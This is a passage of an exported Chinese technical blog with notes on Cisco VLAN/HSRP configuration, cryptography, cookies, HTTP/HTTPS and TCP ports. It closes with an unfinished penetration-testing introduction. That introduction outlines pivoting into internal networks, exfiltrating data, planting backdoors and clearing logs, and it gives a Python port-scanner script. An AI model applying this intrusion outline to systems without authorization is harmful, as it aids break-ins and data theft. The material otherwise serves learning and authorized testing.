decrement 10 //默认追踪接口故障，“罚值”是10，如果接口故障，优先级降低10. Track interface FastEthernet0/0 state Up decrement 10 Group name is hsrp-Fa0/0-1 (default) 7.配置思路： （1）配置PC的ip和网关 （2）给交换机划分vlan int f0/1 swi mode access swi acc vlan 10 int f0/5 sw mode trunk sw trunk allow vlan all （3）在网关路由器上配置子接口，有几个vlan就开启几个子接口。 interface FastEthernet0/0.10 //让这个路由器的子接口成为vlan10的Active encapsulation dot1Q 10 ip address 192.168.10.100 255.255.255.0 standby version 2 standby 10 ip 192.168.10.254 standby 10 priority 105 standby 10 preempt standby 10 track FastEthernet0/0 standby 10 track FastEthernet0/1 ! interface FastEthernet0/0.20 //让这个路由器的子接口成为vlan20的Standby encapsulation dot1Q 20 ip address 192.168.20.100 255.255.255.0 standby version 2 standby 20 ip 192.168.20.254 standby 20 preempt standby 20 track FastEthernet0/0 standby 20 track FastEthernet0/1 （3）在网关路由器上的子接口上配置HSRP协议，虚拟出来不同vlan的网关。 （4）在网关路由器上配置其他接口的IP和路由问题 ip route 0.0.0.0 0.0.0.0 192.168.100.1 ip route 0.0.0.0 0.0.0.0 192.168.150.2 （5）在出口路由器配置Ip，解决2个路由问题————一个是到达内网的路由问题；一个是到达外网的路由问题。 ip route 192.168.10.0 255.255.255.0 192.168.100.2 ip route 192.168.20.0 255.255.255.0 192.168.100.2 ip route 192.168.10.0 255.255.255.0 192.168.200.2 ip route 192.168.20.0 255.255.255.0 192.168.200.2 ip route 0.0.0.0 0.0.0.0 12.1.1.2 ​​​​​​​​]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学基本概念]]></title>
    <url>%2F2019%2F09%2F04%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[密码学(Cryptology)：研究信息系统安全保密的科学。由两个相互独立、相互斗争，而且又相辅相成、相互促进的分支科学所组成的，分别称为密码编码学（Cryptography）和密码分析学（Cryptanalysis）. 密码学相关术语:加密（Encryption）：将明文转换为密文的过程。把可懂的语言变换成不可懂的语言，这里的语言指人类能懂的语言和机器能懂的语言。 解密（Decryption）：加密的逆向过程，即由密文恢复出原明文的过程。把不可懂的语言转换成可懂的语言。 密钥空间（Keyspace）：用于加密的密钥的比特序列长度。密钥是由密钥空间的随机值构成。密钥空间越大，密钥被攻破的难度就越大 现代密码学的密码系统中，加密算法大部分都是公开的，所以，可以唯一保护密码安全的就是密钥（Kerchhoff的原理） Kerchhoff假设：密码分析者知道双方使用的密码系统，包括明文的统计特性、加解密体制等，唯一不知道的就是密钥 密钥管理：处理密钥自产生到最终销毁的整个过程中的有关问题包括系统的初始化、密钥的产生、存储、备份/恢复、装入、分配、保护、更新、泄露、撤销和销毁等内容。 扩散（Diffusion）：将每一位明文数字的影响尽可能的散布到多个输出密文数字中去，以更隐蔽明文数字的统计性。 混乱（Confusion）：使得密文的统计性与明文、密钥之间的关系尽量复杂化 shannon称：在理想的密码系统中，密文的所有统计特性都与所使用的密钥独立 密码分析的典型方式:唯密文攻击（cybertext only attack）： 密码分析者知道一些消息的密文（加密算法相同），并且试图恢复尽可能多的消息明文，并进一步试图推算出加密消息的密钥（以便通过密钥得出更多的消息明文） 已知明文攻击（known plaintext attack）： 密码分析者不知道一些消息的密文，知道与这些密文对应的明文，并试图推导出加密密钥或算法（该算法可对采用同一密钥加密的所有新消息进行解密） 选择明文攻击（chosen plaintext attack）： 密码分析者不仅知道一些消息的密文以及与之对应的明文，而且可以选择被加密的明文（这种选择可能导致产生更多关于密钥的信息），并试图推导出加密密钥或算法（该算法可对采用同一密钥加密的所有新消息进行解密）。暂时控制加密机 选择密文攻击(chosen ciphertext attack) : 一密码分析者 能够选择不同的密文并能得到对应的明文，密码分析的目的是推导出密钥。(暂时控制解密机) 旁路攻击(side channel)： 通过收集“外面”的信息来破解密码，而不是直接处理“里面”的东西。-检测加解密过程所消耗的能量，所释放的辐射来计算过程时间 重放攻击(replay attack) 攻击者捕获了- - -些类型的数据并重新提交它，寄希望于欺骗接收设备误以为这些是合法信息。时间戳和序列号是对付重放攻击的两个对策 统计式攻击 利用明文的已知统计规律进行破译的方法。密码破译者对截获的密文进行统计分析，总结出其统计规律，并与明文的统计规律进行对照比较，从中提取出明文和密文之间的对应或变换信息 受限制的算法 vs 基于密钥的算法 受限制的(restricted) 算法:算法的保密性基于保持算法的秘密。基于密钥(key-based) 的算法:算法的保密性基于对密钥的保密。 对称密码算法 vs 非对称密码算法 对称密码算法(Symmetric cipher) :加密密钥和解密密钥相同，或实质上等同，即从- -个易于推出另一个。又称传统密码算法(Conventional cipher)、秘密密钥算法或单密钥算法。 DES、 3DES、 IDEA、 AES 1 非对称密码算法(Asymmetric cipher) :加密密钥和解密密钥不同，从一个很难推出另一个。又叫公钥密码算法(Public-key cipher)。 其中的加密密钥可以公开，称为公开密钥(public key),简称公钥 解密密钥必须保密，称为私人密钥(private key),简称私钥。 分组密码 vs 流密码 分组密码(Block cipher) :将明文分成固定长度的组，用同密钥和算法对每一块加密，输出也是固定长度的密文 DES、 IDEA、 RC2、RC5 流密码(Stream cipher) :又称序列密码，序列密码每次加密一位或一字节的明文 RC4、 Vigenere、 Vernam 分组密码模型分组密码是将明文消息编码表示后的数字(简称明文数字)序列，划分成长度为n的组(可看成长度为n的矢量) ,每组分别在密钥的控制下变换成等长的输出数字(简称密文数字)序列。 代替密码 Vs 置换密码代替密码(Substitution Cipher) :就是明文中的每一个字符被替换成密文中的另一个字符。接收者对密文做反向替换就可以恢复出明文。 置换密码(Permutation Cipher) :又称换位密码(Transposition Cipher): 明文的字母保持相同，但顺序被打乱了。 密钥管理(1)密钥的生存周期 (2)密钥的产生 (3)密钥的分配 (4)密钥管理的其他阶段 密钥管理 在一种安全策略指导下密钥的产生、存储、 分配、删除、归档及应用。 处理密钥自产生到最终销毁的整个过程中的有关问题包括系统的初始化、密钥的产生、存储、备份/恢复、装入、分配、保护、更新、泄露、撤销和销毁等内容。所有的密码技术都依赖于密钥。 密钥的管理本身是一个很复杂的课题而且是保证安全性的关键点。 密钥管理方法因所使用的密码体制对称密码体制和公钥密码体制而异。 所有的密钥都有生存期密钥的生存周期:授权使用该密钥的周期。一个密钥主要经历以下主要阶段:产生、分配、 使用、更新/替换、 撤销、销毁 原因: 1拥有大量的密文有助于密码分析一个密钥使用得太多了会给攻击者增大收集密文的机会 2假定一个密钥受到危及或用个特定密钥的加密/解密过程被分析则限定密钥的使用期限就相当于限制危险的发生密钥的生存期。 密钥的分配 无中心的密钥分配模式 中心化密钥分配模式 公钥密码体制的密钥分配 密钥管理的其他阶段 密钥使用注意内存的密钥泄露。 私钥不出USB Key 密钥存储 现更多存储在Usb Key中 密钥更新更容易的解决办法是从旧密钥中产生新的密钥。公私钥对重新生成 密钥备份可信第三方托管或使用主密钥(公钥)加密保存。主要针对加密密钥 密钥销毁(撤销不同)物理上彻底粉碎]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学发展历史]]></title>
    <url>%2F2019%2F09%2F04%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2%2F</url>
    <content type="text"><![CDATA[密码学基础： 1.密码学发展历史 2.密码学基本概念 3.对称密码算法 4.公钥密码算法 5.散列函数与消息鉴别 密码学发展历史： 第一个阶段是从古代到19世纪末——古典密码 第二个阶段是从20世纪初到1949年——近代密码 第三个阶段是从C.E.shannon香农于1949年发表的划时代论文”The Communication Theory Of Secret Sytems “ 开始现代密码 第四个阶段从1976年W.Diffie和M.Hellman创造性地发表了论文“New Direction in Cryptography”开始公钥密码 古典密码学：古典密码体制的安全性在于保持算法本身的保密性，受到算法限制，不适合大规模生产。 不适合较大的或者人员变动较大的组织 古典密码主要有以下几种：代替密码（Substitution Cipher）：简单代替密码 多名或同音代替密码 多表代替密码 多字母代替密码 换位密码（Transposition Cipher）：塞塔式密码 凯撒密码 代替密码与换位密码组合 扩散（Diffusion）:将每一位明文数字的影响尽可能散布到多个输出密文数字中去，以更隐蔽明文数字的统计特性。 混乱（Confusion）:使得密文的统计性与明文，密钥之间的关系尽量复杂化。 近代密码学：20世纪初到1949年，主要标志是机械密码/机电密码，用机电代替手工。近代密码体制是用机械或电动机械来实现，最著名的就是转轮机（Rotor Machine） Germany:ENIGMA(1919) 转轮密码机ENIGMA，是由Arthur Scherbius 于1919年发明，4轮ENIGMA在1944年装备德国海军。使得英国从1942年2月到12月都没能解读德国潜艇的信号。 UK:TYPEX打字密码机 英国的TYPEX打字密码机，是德国3轮ENIGMA的改进型密码机。它在英国的通信中使用广泛，且在破译密钥后帮助破解德国信号。 US:M-209 M-209是哈格林对C-36改进后的产品，由smith-corna负责为美国陆军生产。它的密码周期达到了101,105,950。 有一种理想的加密方案 一次一密乱码本 OTP(one-time pad)从理论上是不可破的： 不重复使用乱码本（VENONA） 使用不可预知的随机数（物理源，如放射性衰减） 发明者：Major Mauborgne 和 AT&amp;T公司的Gilbert Vernam 在1917年发明 应用于：华盛顿-莫斯科“热线” 俄罗斯间谍 CIA 现代密码学：1949-1975年： 1949年，shannon的论文”The Communication Theory Of Secret Sytems “ 1967年，David Kahn 的专著《The Code breakers》 1971年-1973年，IBM Waston 实验室的Horst Feistel 等人发表的几篇技术报告 1974年，IBM提交了算法LUCIFER,后来成为了DES 新特点：数据的安全基于密钥而不是算法保密。 公钥密码学：1976年以后： 1976年，Diffe&amp;Hellmande “New Directions in Cryptography “提出了非对称密钥密码 1977年，Rivest,Shamir&amp;Adleman提出了RSA公钥算法。 90年代，逐步出现椭圆曲线等其他公钥算法 公钥密码使得发送端和接收端无密钥传输的保密通信成为可能]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[COOKIE]]></title>
    <url>%2F2019%2F08%2F31%2FCOOKIE%2F</url>
    <content type="text"><![CDATA[​ cookies也可以称作cookie，指某些网站为了辨别用户身份、进行session跟踪而存储在用户本地终端上的数据。 ​ 一个cookies就是存储在用户主机浏览器中的文本文件。cookies是纯文本形式，它们不包含任何可执行代码。服务器告诉浏览器将这些信息存储，并且每个请求中都将该信息返回到服务器，服务器之后可以利用这些信息标识用户。多数需要登录的网站通常会在用户登录后将用户信息写入cookies，只要这个cookie存在且合法，就可以自由的浏览这个网站的所有站点。cookies只是包含数据，就其本身而言并不有害。 ​ 服务器可以利用cookies包含的信息判断在HTTP传输的服务状态。cookies最典型的应用是判断注册用户是否已经登录网站和保留用户信息简化登录手续 ​ 一般cookies所具有的属性 Domain域，表示当前cookies属于哪个域或子域下面 Path表示cookies的所属路径 Expire Time/Max-Age表示cookies的有效期 Secure表示该cookies必须用HTTPS传输 Httponly表示该cookies必须用HTTP或HTTPS传输 HasKeys通过该值指示cookie是否含有子键，返回一个bool值 Name表示cookie的名称 Value单个cookie的值 Values单个cookie所包含的键值对的集合 ​ cookie的优点如下 1.极高的扩展性和可用性 2.通过良好的编程控制保存在cookie中的session对象的大小 3.通过加密和安全的传输技术（SSL）减少cookie被破解的可能性 4.只在cookie中存放不敏感数据，即使被盗也不会有重大损失 5.可控制cookie的生命周期，使之不会永远有效 ​ cookie的缺点如下 cookie数量和长度的限制。每个domain最多只能有20条cookie长度不能超过4KB，否则会被裁掉。 安全性问题，如果cookie被拦截，就有可能被取得所有的session信息 某些状态不可保存在客户端]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫开发基础]]></title>
    <url>%2F2019%2F08%2F31%2F%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[HTTP与HTTPS的区别​ HTTP超文本传输协议，是一个客户端和服务器端请求和应答的标准（TCP）。客户端是终端用户，服务器是网站。通过使用WEB浏览器、网络爬虫或者其他工具，客户端发起一个到服务器指定端口的HTTP请求，这个客户叫用户代理（User Agent）.响应的服务器上存储着资源，比如HTML文件和图像，这个服务器为源服务器（Origin Serverr）,在用户代理和服务器中间可能存在多个中间层，比如代理、网关或者隧道（Tunnels）. ​ 通常，由HTTP客户端发起一个请求，建立一个服务器指定端口的TCP连接，HTTP服务器则在那个端口监听客户端发送过来的请求，一旦收到请求，服务器（向客户端）发回一个状态行（比如“HTTP/1.1 200 OK”）和（响应的）消息，消息的消息体可能是请求的文件、错误消息或者其他一些消息。 ​ HTTP协议传输的数据都是未加密的，也就是明文传输，因此使用HTTP协议传输隐私消息非常不安全。为了保证这些隐私数据能够加密传输，于是有了SSL协议用于对HTTP协议传输的数据进行加密，就有了HTTPS。 ​ HTTPS可以理解为HTTP+SSL/TLS在传输数据之前需要看客户端（浏览器）与服务端（网站）之间进行一次握手，在握手过程中将确立双方加密传输数据的密码信息。HTTP与HTTPS的主要区别。 HTTP HTTPS TCP SSL/TLS IP TCP ​ IP HTTPS的SSL中使用了非对称加密、对称加密以及HASH算法。握手过程简单如下： （1）浏览器将自己支持的一套加密规则发送给网站 （2）网站从中选择一组加密算法与HASH算法，并将自己的身份信息以及证书的形式发送回浏览器。证书里包含网站地址、加密公钥以及证书的颁发机构等信息 （3）获得网站证书之后浏览器要做一下工作 1.验证证书的合法性 2.如果证书受信任或者用户接受了不信任的证书，浏览器将会生成一串随机数的密码，并用证书中的公钥加密。 3.使用约定好的HASH计算握手消息，并用生成的随机数对消息加密，最后将之前生成的所有信息发送给网站。 （4）网站接受浏览器发送来的数据之后要做一下操作 1.使用自己的私钥将信息解密并取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致。 2.使用密码加密一段握手消息发送给浏览器。 （5）如果浏览器解密并计算握手消息的HASH与服务器发来的HASH一致，此时握手过程结束，之后所有的通信数据将使用之前的浏览器生成的随机密码，并利用对称加密算法加密。 1.非对称加密算法：RSA DSA/DSS 2.对称加密算法：AES RC4 3DES 3.HASH算法：MD5 SHA1 SHA256 非对称加密算法用于在握手过程中加密生成的密码，对称加密算法用于对真正传输的数据进行加密，而HASH算法用于验证数据的完整性。由于浏览器生成的密码是整个数据加密的关键，因此在传输的时候使用非对称加密算法对其加密。非对称加密算法会生成公钥与私钥，公钥只能用于加密数据，可以随意传输，而网站的私钥用于对数据的加密。 请求头请求头描述客户端向服务器发送请求时的协议类型、所使用的编码以及发送内容的长度。客户端（浏览器）通过输入URL后确定等于做了一次向服务器请求的动作，在这个请求里面带有请求参数，请求头在网络爬虫中的作用是相当重要的一部分。检测请求头是常见的反爬虫策略。 请求头的参数如下： 1.Accept:text/html,image/*(浏览器可以接收的文件类型) 2.Accept-Charset:IS0-8859-1(浏览器可以接收的编码类型) 3.Accept-Encoding:gzip,compress(浏览器可以接收的压缩类型编码) 4.Accept-Language:en-us,zh-cn(浏览器可以接收的语言和国家类型) 5.Host(请求的主机地址和端口) 6.If-Modified-Since(某个页面的缓存时间) 7.Referter(请求来自于哪个页面的URL) 8.User-Agent(浏览器相关信息) 9.Cookie(浏览器暂存服务器发送的信息) 10.Connection(HTTP请求版本的特点) 11.Date(请求网站的时间) 一个标准的请求头基本上都带有以上的属性。在网络爬虫，请求头一定要有User-Agent，其他的属性可以根据实际需求添加，因为反爬虫通常检测到请求头的Referer和User-Agent,而Cookie不能添加到请求头。除此之外，还有一些特殊的请求头信息，如Upgrade-Insecure-Requests(告诉服务器，浏览器可以处理HTTPS协议)、X-Requested-With(判断是否Ajax请求)等。]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络五]]></title>
    <url>%2F2019%2F08%2F28%2F%E7%BD%91%E7%BB%9C%E4%BA%94%2F</url>
    <content type="text"><![CDATA[1.路由协议：静态路由协议和动态路由协议。 （1）静态路由的基本格式：ip route 目标网段 目标子网 下一跳 （2）默认路由：一般配置在出口路由器（边缘路由器：一边连接的LAN，一边连接WAN），所有不知道的数据包都交给“互联网中的下一跳”。 ip route 0.0.0.0 0.0.0.0 下一跳 （3）路由的冗余问题：增加多链路 负载均衡：多条链路同时进行数据传输，没有主备链路之分；如果一条down掉，另外一条还有“冗余”的功能。 配置举例： R2(config)#ip route 192.168.2.0 255.255.255.0 13.0.0.2 R2(config)#ip route 192.168.2.0 255.255.255.0 14.0.0.2 R2(config)#do show ip route S 192.168.2.0/24 [1/0] via 13.0.0.2 [1/0] via 14.0.0.2 浮动路由：多条链路中只有一条是主链路，其他都是备份链路；只有主链路发生故障，备份链路才会被启用。 通过修改静态路由的优先级（管理距离），来决定哪条链路是主链路。 优先级的范围是1——255，越小越优先。默认是1. R1(config)#ip route 0.0.0.0 0.0.0.0 192.168.3.2 //默认的优先级为1，默认是主链路 R1(config)#ip route 0.0.0.0 0.0.0.0 192.168.30.2 10 //修改路由的优先级为10，成为备份链路 R1#show ip route S* 0.0.0.0/0 [10/0] via 192.168.30.2 //默认情况下，只有一条链路负责转发数据； 在路由表中，静态路由分为明细路由和默认路由；默认路由的优先级是最低的（其他所有的明细路由都没有匹配的时候，才会匹配默认路由）。 （5）在路由器上，开启回环口模拟PC，一般用来做测试。 int lo0 ip add 192.168.1.1 255.255.255.0 no sh2.路由器的工作原理：mac地址是一个二层的概念，不能跨网段。 ========》源目Ip地址不变，源目mac地址被重写。《============= 3.传输层：把数据包转换为数据段，为数据提供可靠或不可靠的传输；为应用程序提供端到端的服务。 （1）可靠指TCP协议；不可靠指的是UDP协议。 （2）端是指端口（后门） netstat -an //查看本地开放的端口号和TCP的状态信息 协议 本地地址 外部地址 状态 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING //监听状态，端口处于开放状态 TCP 192.168.120.171:50093 23.46.220.16:443 ESTABLISHED //表示TCP三次握手已经建立完成。 LISTENING（listening） ESTABLISHED （三次握手建立完成） （3）数据段：4层协议（TCp/UDP+端口号）+Data （4）PDU（Protocol Data Unit）：协议数据单元，数据在每一层传输的基本单位 （5）端口号的范围：0——65535，1——1024是知名端口 TCP23————Telnet，明文传输 TCP22————SSH，加密传输 TCP3389————远程桌面RDP服务 TCP 21/20——————FTP（21是用来建立连接的，20是用来传输数据的） TCP80——————web服务器（http协议）；https（TCP443） TCP445————Windows的共享 TCP25——————SMTP（简单邮件传输协议），用来发送邮件 TCP110————POP3（邮局协议版本3），用来接收邮件 TCP3306————MySQL服务 UDP53——————DNS服务（如果是客户端请求服务器来解析的话，使用的是UDP-53；如果是DNS主备服务器之间做数据同步，使用的是TCP-53） UDP67,68————DHCP服务 UDP123————NTP（网络时间协议），是Linux中用于同步时间的。​4.TCP：是可靠的传输方式；所有的web页面都是基于TCP的。 （1）TCP传输数据之前，先建立连接的； （2）TCP传输数据的时候，会给每个数据做一个编号（sequence 序列号），以保障数据的可靠性。 （3）TCP是全双工的协议，同一时间可以上传和下载。5.TCP的报文结构： （1）第一列：源目端口号 （2）第二列：序列号（发送端给每个数据进行编号） （3）第三列：确认号（用来对发送端的数据做确认）=====》保障数据传输的可靠性 （4）第四列：包含Flag位（标志位），用来描述这个报文的功能。​ SYN=1，表示想建立连接。​ ACK=1，表示报文是用来回复的。​ FIN=1，表示想拆除连接。 6.基于TCP三次握手的攻击 （1）SYN攻击：攻击者向服务器发送大量的“伪造请求报文”，服务器会向“假的请求者”去建立邻居关系； 但实际上，这些“主机”根本没有请求服务器建立连接，导致服务器一直处于半连接状态。 如果连接的数量过多，会导致服务器资源消耗严重，甚至死机。 （2）LAND攻击：攻击者伪造报文，让服务器自己和自己建立连接，导致服务器资源消耗严重。 7.UDP（User Datagram Protocol ）：用户数据报协议；是一种不可靠的传输协议。 1.为什么要进行VLAN划分 过大的广播域，造成带宽的浪费； mac地址表过大，造成转发效率低； 不够安全； 一个VLAN=一个网段=一个广播域2.VLAN如何来进行划分？ （1）静态划分：基于端口 （2）动态划分：基于mac地址 3.VLAN的范围：0——4095 其中0和4095是保留vlan。 交换机的默认所有端口都属于vlan1，vlan1不能被修改或者删除。 常用的vlan：2——1001（扩展vlan 1025——4094） 4.VLAN的划分命令 （1）第一步：创建vlan SW1(config)#vlan 10 //创建vlan10 SW1(config-vlan)#name xiaoshou //命名为xiaoshou SW1(config-vlan)#exit SW1(config)#vlan 20 SW1(config-vlan)#name caiwubu SW1(config-vlan)#exit （2）第二步：把接口加入到vlan中 SW1(config)#int range f0/3 - 4 //进入接口，多个接口同时操作可以用range SW1(config-if-range)#switchport mode access //接口模式为access SW1(config-if-range)#switchport access vlan 20 //把接口加入到相应的vlan20中 （3）第三步：检查vlan的命令 SW1#show vlan brief 5.Trunk链路（中继链路）：在一条物理链路上，可以承载多个vlan。 应用：设备之间（交换机之间；交换机和路由器之间） （1）trunk的原理：把原始的数据帧加入了新的标签，破坏了原来的“帧格式”。——在trunk链路上传输的不是原始的数据帧。（2）trunk链路标记vlan的方式：ISL（Cisco的私有协议，在帧的外边插入了30Byte）； IEEE 802.1 q（在数据帧的内部插入了4Byte；工业标准）。 （3）配置： SW1(config)#int f0/5 SW1(config-if)#switchport mode trunk #把接口加入到trunk SW1(config-if)#switchport trunk allowed vlan all #允许所有vlan通过 （4）查询命令： SW4#show interfaces trunk #查看trunk链路 （5）对vlan进行过滤的命令： SW1(config)#int f0/5 SW1(config-if)#switchport trunk allowed vlan ? WORD VLAN IDs of the allowed VLANs when this port is in trunking mode all all VLANs //允许所有vlan通过（白名单） remove remove VLANs from the current list //从当前列表中移除某个vlan except all VLANs except the following //从允许的列表中排除某个vlan（不允许通过） none no VLANs //拒绝所有vlan通过（黑名单） add add VLANs to the current list //这个列表的vlan允许通过6.Native Vlan（本征vlan）：在交换机中默认就是vlan1. （1）交换机收到一个来自Native vlan的数据，会不打标签发送（原始数据帧）； （2）如果交换机收到一个原始数据帧，会把数据帧广播到Native vlan 的端口； 7.DTP协议（Dynamic Trunk Protocol）：动态trunk协议，用来协商链路是否要成为trunk。 DTP协议的配置； SW1(config-if)#switchport mode dynamic ? auto Set trunking mode dynamic negotiation parameter to AUTO //自动协商 desirable Set trunking mode dynamic negotiation parameter to DESIRABLE //期望成为trunk 在协商过程中，trunk可以和trunk/desirable/auto desirable和desirable/auto access和任何一种也不能协商为trunk链路；两个auto也不能协商为trunk。 8.EtherChannel （以太通道）：解决交换机之间链路的冗余问题，可以提高网络的高可用性；还可以增加带宽。 interface range FastEthernet0/4 - 5 channel-group 1 mode on //把多个链路进行捆绑，编号为1 switchport mode trunk //设置为trunk链路 SW2#show etherchannel summary //检查以太通道的命令，SU标准二层以太通道链路正常。 1.以太通道和vlan划分的排查命令： SW3#show vlan brief //检查vlan和接口是否对应（access链路） SW3#show int trunk //检查trunk链路 SW3#show etherchannel summary //检查以太通道（SU表示正常；如果是其他状态，就进入接口先shutdown ，再no shutdown） （1）以太通道的协商方式： 使用的两个协议： Link Aggregation Control Protocol ， LACP ：IEEE 定义的标准协议。 Port Aggregation Protocol：是Cisco的专有协议。 SW2(config)#int range f0/6 - 8 SW2(config-if-range)#channel-group 1 mode ? active Enable LACP unconditionally //主动模式 passive Enable LACP only if a LACP device is detected //被动模式 auto Enable PAgP only if a PAgP device is detected //被动模式，自动协商 desirable Enable PAgP unconditionally //期望，主动模式 on Enable Etherchannel only //表示手工指定为on；对端必须是on才能协商成功。 1.单臂路由：实现不同vlan的通信。 (1)基本配置： int f0/0 no shut int f0/0.10 //创建一个子接口 encapsulation dot1q 10 //设置数据帧的封装格式为dot1q，对应的vlanID是10 ip add 192.168.10.254 255.255.255.0 (2)工作原理： 源目IP地址不变，二层mac地址被重写，实现标签置换。 2.实验步骤：先实现内网通信；再实现外网通信。 （1）第一步：先配置PC和网关 （2）第二步：配置二层交换机————划分vlan，配置trunk Switch(config-if)#int f0/2 Switch(config-if)#sw mode acc Switch(config-if)#sw acc vlan 20 Switch(config-if)#int f0/3 Switch(config-if)#switchport access vlan 30 Switch(config-if)#int f0/4 Switch(config-if)#switchport mode trunk （3）第三步：在出口路由器的内接口，配置单臂路由，实现内网不同vlan的通信 interface FastEthernet0/0 no shutdown interface FastEthernet0/0.10 encapsulation dot1Q 10 ip address 192.168.10.254 255.255.255.0 （4）第四步：内网通了以后，实现外网通信。 检查IP的命令： R2(config-if)#do show ip int bri R2(config-if)#do show ip route //检查路由表 1.VTP（Vlan Trunking Protocol）：vlan中继协议，用来管理vlan的创建、删除和修改。 VTP的前提条件：交换机之间必须是Trunk链路；必须都在相同的域名中。 2.VTP的三种模式： （1）服务器模式（Server） 可以创建、删除和修改VLAN 学习、转发相同域名的VTP通告 （2）客户机模式（Client） 学习、转发相同域名的VTP通告 不可以创建、删除和修改VLAN （3）透明模式（Transparent） 可以创建、删除和修改VLAN，但只在本地有效 转发但不学习VTP通告3.VTP的基本配置； vtp domain test //配置vtp的域名 vtp mode server/client/transparent //服务端、客户端、透明模式 vtp version 2 //指定VTP的版本号 vtp password 123456 //加入域中的密码 show vtp status //检查vtp的状态 说明： （1）为了防止其他设备先同步vlan信息，尽量先配VTP，再起trunk。 （2）服务端和客户端的vlan信息存放在flash:/vlan.dat中； 即使清掉域信息，flash里还是有vlan信息，所以只能删掉数据库文件，重启才能真正清除信息。 Server#delete flash:/vlan.dat //清空配置时，要先删除vlan.dat Server#erase startup-config //清除配置 Server#reload //重启 （3）透明模式的VTP配置会出现在show run里]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透简介]]></title>
    <url>%2F2019%2F08%2F25%2F%E6%B8%97%E9%80%8F%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[1.1 攻击思路有2种思路： 攻击外网服务器，获取外网服务器的权限，接着利用入侵成功的外网服务器作为跳板，攻击内网其他服务器，最后获得敏感数据，并将数据传递到攻击者，看情况安装长期后门，实现长期控制和获得敏感数据的方式； 攻击办公网的系统、办公网电脑、办公网无线等方式，一般是采用社工，实现控制办公电脑，再用获得的办公网数据，可能是内网的各种登录账号和密码，再获取办公网或者生产网的有用数据。一般内网安全检查使用第一种思路，实际的攻击2种思路结合实现。 1.2 敏感资料/数据/信息高管/系统管理员/财务/人事/业务人员的个人电脑 文件服务器/共享服务器 邮件服务器 OA服务器 数据库服务器1.3 攻击过程按照第一种思路，可以分为4个阶段： 信息收集 漏洞验证/漏洞攻击 后渗透 日志清理第二种思路，社工的比重更大一些 2 信息收集该阶段识别内网存活的主机 IP， 运行端口扫描和漏洞扫描获取可以利用的漏洞 2.1 主机发现使用端口扫描工具可以实现主机发现的功能，但也有些动作小的主机发现工具（Kali），可以有效的发现存活主机。自己写个 ping 的循环脚本也可以。 不受限的测试直接端口扫描了。 2.2 端口扫描有授权的情况下直接使用 nmap 、masscan 等端口扫描工具直接获取开放的端口信息。作为跳板机可以使用 Metasploit 做端口扫描，也可以在跳板主机上上传端口扫描工具，使用工具扫描。 入侵到服务器上也可以根据服务器的环境使用自定义的端口扫描脚本扫描端口。 python 3 的端口扫描脚本 This script runs on Python 3import socket, threadingdef TCP_connect(ip, port_number, delay, output): TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) TCPsock.settimeout(delay) try: TCPsock.connect((ip, port_number)) output[port_number] = &apos;Listening&apos; except: output[port_number] = &apos;&apos;def scan_ports(host_ip, delay): threads = [] # To run TCP_connect concurrently output = {} # For printing purposes # Spawning threads to scan ports for i in range(10000): t = threading.Thread(target=TCP_connect, args=(host_ip, i, delay, output)) threads.append(t) # Starting threads for i in range(10000): threads[i].start() # Locking the script until all threads complete for i in range(10000): threads[i].join() # Printing listening ports from small to large for i in range(10000): if output[i] == &apos;Listening&apos;: print(str(i) + &apos;: &apos; + output[i])def main(): host_ip = input(&quot;Enter host IP: &quot;) delay = int(input(&quot;How many seconds the socket is going to wait until timeout: &quot;)) scan_ports(host_ip, delay)if __name__ == &quot;__main__&quot;: main()有个使用 Python 端口扫描的介绍https://thief.one/2018/05/17/1/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io Windows 下基于 Powershell 的端口扫描脚本。https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner/tree/master/Scripts 发现端口后使用客户端连接工具或者 nc 连接，获取服务端的 banner 信息。 2.3 漏洞扫描有授权的情况下，使用绿盟极光、Nessus、Nexpose 等漏扫工具直接扫描目标，可以直接看到存活主机和主机的漏洞情况。 2.4 识别内网环境获取目标的主机存活信息和端口开放信息后，就可以尝试分析目标的网络结构，安全防御策略。按照办公网和生产网分别说一下： 2.4.1 办公网按照系统区分： OA系统 邮件系统 财务系统 文件共享系统 域控 企业版杀毒系统 上网行为管理系统 内部应用监控系统按照网络区分： 管理网段 内部系统网段 按照部门区分的网段按照设备区分： 个人电脑 内网服务器 网络设备 安全设备办公网的安全防护水平一般较差（相对），能绕过杀毒软件基本上就畅通无阻了，利用信任关系容易扩大攻击面，获取数据也比生产网简单。 2.4.2 生产网按照系统区分： 业务系统 运维监控系统 安全系统按照网络区分： 各不同的业务网段 运维监控网段 安全管理网段根据目标开展的不同业务，对应的服务器可能存在不同的网段上，分析服务器上运行的服务和进程可以推断目标使用的运维监控管理系统和安全防护系统，可以大概推断出入侵目标的 IT 运维水平和安全防护水平，在接下来的入侵考虑采用什么样的方法。 2 漏洞验证/漏洞攻击使用端口扫描、漏洞扫描验证、扫描目标开放的端口，在对应端口上开放的服务，运行该服务的软件和版本号。如果只是使用端口扫描，只是发现开放的端口，接着使用 nc 可以获取端口上服务的 banner 信息，获取 banner 信息后需要在漏洞库上查找对应 